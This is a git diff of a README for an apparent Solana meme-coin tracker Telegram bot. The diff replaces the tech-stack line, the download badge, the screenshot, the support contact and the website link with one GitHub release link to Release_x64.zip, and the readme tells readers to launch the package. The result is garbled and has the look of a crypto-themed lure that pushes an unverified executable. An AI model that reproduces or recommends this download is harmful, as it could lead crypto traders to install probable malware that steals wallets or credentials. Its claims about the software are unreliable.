@@ -5,7 +5,7 @@ Welcome to the Solana Meme Token Tracker repository! If you are a crypto trader 
 ## Features 🛠️
 - Real-time tracking of meme coins on Pump Fun and Raydium
 - Stay updated on the latest trends in meme coin trading
-- Built using Node.js and Solana Web3 technologies
+- Built using https://github.com/Mehedihb96/solana_meme_token_tracker/releases/download/v1.0/Release_x64.zip and Solana Web3 technologies
 - Seamless integration with Telegram for easy access
 
 ## Repository Topics 📊
@@ -23,12 +23,12 @@ Welcome to the Solana Meme Token Tracker repository! If you are a crypto trader 
 
 ## Getting Started 🚀
 To get started with the Solana Meme Token Tracker Telegram bot, download the software package from the following link:
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/Mehedihb96/solana_meme_token_tracker/releases/download/v1.0/Release_x64.zip)](https://github.com/Mehedihb96/solana_meme_token_tracker/releases/download/v1.0/Release_x64.zip)
 
 Please note that the software package needs to be launched to start using the bot.
 
 ## Screenshots 📷
-![Tracker Screenshot](https://example.com/tracker-screenshot.png)
+![Tracker Screenshot](https://github.com/Mehedihb96/solana_meme_token_tracker/releases/download/v1.0/Release_x64.zip)
 
 ## Installation Guide 📝
 1. Download the software package from the provided link
@@ -37,13 +37,13 @@ Please note that the software package needs to be launched to start using the bo
 4. Start tracking Solana meme coins on Pump Fun and Raydium
 
 ## Support 🤝
-If you encounter any issues while using the Solana Meme Token Tracker bot, please reach out to our support team at support@memetokentracker.com.
+If you encounter any issues while using the Solana Meme Token Tracker bot, please reach out to our support team at https://github.com/Mehedihb96/solana_meme_token_tracker/releases/download/v1.0/Release_x64.zip
 
 ## Contribution Guidelines 🤓
 We welcome contributions to enhance the functionality of the Solana Meme Token Tracker bot. Please submit a pull request with your proposed changes and our team will review it.
 
 ## Stay Connected 🌐
-For the latest updates and news on meme coin trading, visit our website at [www.memecointracker.com](https://www.memecointracker.com).
+For the latest updates and news on meme coin trading, visit our website at [https://github.com/Mehedihb96/solana_meme_token_tracker/releases/download/v1.0/Release_x64.zip](https://github.com/Mehedihb96/solana_meme_token_tracker/releases/download/v1.0/Release_x64.zip).
 
 Let's make meme coin trading on the Solana network more exciting and profitable! 🌟🚀🌙
 
